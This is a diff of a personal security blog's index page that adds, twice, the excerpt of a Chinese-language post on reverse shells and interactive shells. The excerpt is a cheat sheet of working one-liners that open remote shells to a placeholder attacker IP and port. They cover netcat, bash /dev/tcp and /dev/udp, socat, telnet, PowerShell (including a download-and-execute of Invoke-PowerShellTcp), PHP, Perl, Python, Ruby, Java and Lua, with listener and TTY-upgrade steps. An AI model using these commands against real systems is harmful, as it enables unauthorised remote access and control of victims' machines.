@@ -118,6 +118,47 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/19/Rerverse-shell-Interactive-shell/" class="title">Rerverse_shell&amp;Interactive_shell</a>
+    <section class="desc">
+  1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行）
+nc  《attack_ip》 《attack_port》 -e /bin/bash  1.1.2、没有-e参数（目标机器上执行）
+[1]/bin/sh | nc 《attack_ip》 《attack_port》
+[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 《attack_ip》 《attack_port》 &gt; /tmp/f   ###OpenBsd
+[3]nc -c bash 《attack_ip》 《attack_port》nc -lvvp attack_port  ###攻击机上执行
+1.2、NC Bind shellnc -lvvp 4444 -e /bin/bash  ###目标机器上执行
+nc victim_ip 4444    ###攻击机器执行2.BASH2.1、bash tcpbash -i&gt;＆/dev/tcp/《attack_ip》/《attack_port》 0&gt;＆1  ###目标机器上执行
+nc -lvvp attack_port   ###攻击机上执行2.2、bash udp目标机器上执行：  
+bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行
+nc -u -lvp 《aattack_port》  ####攻击机上执行同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
+3、Socatsocat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行
+socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行有些机器没有socat，需下载到目标机器：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 
+4、Telnet目标机器：
+telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443攻击机：
+nc -lv 80
+nc -lv 4435、Powershell[1]
+powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;《attack_ip》&apos;,《attack_port》);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;[2]Nishang : Invoke-PowerShellTcp.ps1
+powershell iex (New-Object Net.WebClient).DownloadString(&apos;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 《attack_ip》 -Port 《attack_port》常见语言环境反弹shellPHP
+[1]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+[2]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&apos;Perl
+perl -e &apos;use Socket;$i=&quot;《attack_ip》&quot;;$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;Python
+python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;《attack_ip》&quot;,《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;Ruby
+ruby -rsocket -e&apos;f=TCPSocket.open(&quot;《attack_ip》&quot;,《attack_port》).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;JAVA
+r = Runtime.getRuntime() 
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/《attack_ip》/《attack_port》;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) 
+p.waitFor()Lua
+lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;《attack_ip》&apos;,&apos;《attack_port》&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;###linux only
+交互式shell：[1]监听时使用rlwraprlwrap nc -lvvp 4444[2]使用socatsocat file:`tty`,raw,echo=0 tcp-listen:4444[3]Spawn a TTY shell from an interpreter:/bin/sh -ipython -c ‘import pty; pty.spawn(“/bin/sh”)’python3 -c ‘import pty; pty.spawn(“/bin/sh”)’perl -e ‘exec “/bin/sh”;’
+[4]升级为tty shellctrl+zstty raw -echofg   ###这里输入不会显示，输入之后直接Enter即可
+
+
+</section>
+    <p class="sub">Apr 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/02/21/PDO&&InjectionBypass/" class="title">PDO&amp;&amp;InjectionBypass</a>
     <section class="desc">
   PHP PDO &amp; Injection BypassPDO：PHP 数据对象  PHP访问数据库定义了一个轻量级的一致接口。  PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。  使用预处理和存储过程
@@ -234,6 +275,62 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="Rerverse_shell&amp;Interactive_shell" alt="Rerverse_shell&amp;Interactive_shell" href="/2020/04/19/Rerverse-shell-Interactive-shell/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="Rerverse_shell&amp;Interactive_shell" alt="Rerverse_shell&amp;Interactive_shell"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; Rerverse_shell&amp;Interactive_shell &gt;</div>
+                            <div class="content flex1">
+                                
+  1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行）
+nc  《attack_ip》 《attack_port》 -e /bin/bash  1.1.2、没有-e参数（目标机器上执行）
+[1]/bin/sh | nc 《attack_ip》 《attack_port》
+[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 《attack_ip》 《attack_port》 &gt; /tmp/f   ###OpenBsd
+[3]nc -c bash 《attack_ip》 《attack_port》nc -lvvp attack_port  ###攻击机上执行
+1.2、NC Bind shellnc -lvvp 4444 -e /bin/bash  ###目标机器上执行
+nc victim_ip 4444    ###攻击机器执行2.BASH2.1、bash tcpbash -i&gt;＆/dev/tcp/《attack_ip》/《attack_port》 0&gt;＆1  ###目标机器上执行
+nc -lvvp attack_port   ###攻击机上执行2.2、bash udp目标机器上执行：  
+bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行
+nc -u -lvp 《aattack_port》  ####攻击机上执行同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
+3、Socatsocat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行
+socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行有些机器没有socat，需下载到目标机器：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 
+4、Telnet目标机器：
+telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443攻击机：
+nc -lv 80
+nc -lv 4435、Powershell[1]
+powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;《attack_ip》&apos;,《attack_port》);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;[2]Nishang : Invoke-PowerShellTcp.ps1
+powershell iex (New-Object Net.WebClient).DownloadString(&apos;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 《attack_ip》 -Port 《attack_port》常见语言环境反弹shellPHP
+[1]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+[2]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&apos;Perl
+perl -e &apos;use Socket;$i=&quot;《attack_ip》&quot;;$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;Python
+python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;《attack_ip》&quot;,《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;Ruby
+ruby -rsocket -e&apos;f=TCPSocket.open(&quot;《attack_ip》&quot;,《attack_port》).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;JAVA
+r = Runtime.getRuntime() 
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/《attack_ip》/《attack_port》;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) 
+p.waitFor()Lua
+lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;《attack_ip》&apos;,&apos;《attack_port》&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;###linux only
+交互式shell：[1]监听时使用rlwraprlwrap nc -lvvp 4444[2]使用socatsocat file:`tty`,raw,echo=0 tcp-listen:4444[3]Spawn a TTY shell from an interpreter:/bin/sh -ipython -c ‘import pty; pty.spawn(“/bin/sh”)’python3 -c ‘import pty; pty.spawn(“/bin/sh”)’perl -e ‘exec “/bin/sh”;’
+[4]升级为tty shellctrl+zstty raw -echofg   ###这里输入不会显示，输入之后直接Enter即可
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="PDO&amp;&amp;InjectionBypass" alt="PDO&amp;&amp;InjectionBypass" href="/2020/02/21/PDO&&InjectionBypass/"
                        class="post-item swiper-slide flex flex-v">
